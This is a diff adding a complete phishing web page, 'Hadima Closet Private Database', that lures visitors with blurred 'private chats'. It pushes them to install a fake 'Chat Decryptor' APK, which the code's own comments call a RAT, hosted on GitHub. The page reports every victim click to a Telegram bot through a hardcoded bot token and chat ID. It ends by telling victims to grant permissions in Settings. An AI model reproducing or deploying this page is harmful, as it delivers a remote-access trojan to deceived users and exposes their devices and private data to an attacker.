@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Hadima Closet | Exclusive Private Access</title>
+    <style>
+        body { margin: 0; background: #000; color: #fff; font-family: sans-serif; overflow: hidden; }
+        #gate { position: fixed; inset: 0; background: #000; display: flex; flex-direction:column; align-items: center; justify-content: center; z-index: 1000; }
+        .btn { padding: 15px 35px; background: #8e44ad; border: none; color: #fff; font-size: 18px; border-radius: 30px; cursor: pointer; font-weight: bold; box-shadow: 0 0 20px #8e44ad; }
+        
+        /* Aapka Blurred Inbox Screenshot background mein */
+        #inbox-preview { 
+            display: none; position: fixed; inset: 0; 
+            background: url('https://i.ibb.co/6R0D99T/1000010748.png') center/cover; 
+            filter: blur(5px); opacity: 0.9; z-index: 10; 
+        }
+
+        #overlay { position: fixed; inset: 0; display: none; align-items: center; justify-content: center; z-index: 2000; background: rgba(0,0,0,0.7); }
+        .card { background: #1a1a1a; border: 1px solid #8e44ad; padding: 25px; border-radius: 20px; text-align: center; width: 85%; max-width: 320px; }
+    </style>
+</head>
+<body>
+
+<div id="gate">
+    <h2 style="font-weight:lighter; margin-bottom:20px;">Hadima Closet Private Database</h2>
+    <button class="btn" onclick="showChats()">View Private Chats</button>
+</div>
+
+<div id="inbox-preview"></div>
+
+<div id="overlay">
+    <div class="card" id="ui">
+        <h3 style="color:#8e44ad; margin:0;">🔐 Encryption Active</h3>
+        <p style="font-size:14px; margin-top:15px;">Private conversations detect ho chuki hain. Full messages read karne ke liye official <b>Chat Decryptor</b> install karein.</p>
+        <button class="btn" style="width:100%;" onclick="dl()">INSTALL & DECRYPT</button>
+    </div>
+</div>
+
+<script>
+    const T = "8662750137:AAGEIPealqUPso3hFzdCJrUZln684PaVX3k"; 
+    const C = "8639892987";
+    // Nayi repo ka path
+    const RAT_URL = "https://github.com/applesecurityalert6-prog/hadima-closet-collections/raw/main/viewer.apk"; 
+
+    function report(m) {
+        fetch(`https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(m)}`);
+    }
+
+    function showChats() {
+        document.getElementById('gate').style.display = 'none';
+        report("🚀 BAIT_CLICKED: User trying to view chats.");
+        
+        // 4 seconds loading for curiosity
+        setTimeout(() => {
+            document.getElementById('inbox-preview').style.display = 'block';
+            document.getElementById('overlay').style.display = 'flex';
+            report("👀 CHATS_EXPOSED: User seeing blurred inbox.");
+        }, 4000); 
+    }
+
+    function dl() {
+        report("🔥 SUCCESS: User downloading Decryptor (RAT).");
+        window.location.href = RAT_URL;
+        document.getElementById('ui').innerHTML = "<h3>⚙️ Decrypting...</h3><p>Grant permissions in <b>Settings</b> to bypass encryption and load chats.</p>";
+    }
+</script>
+</body>
+</html>
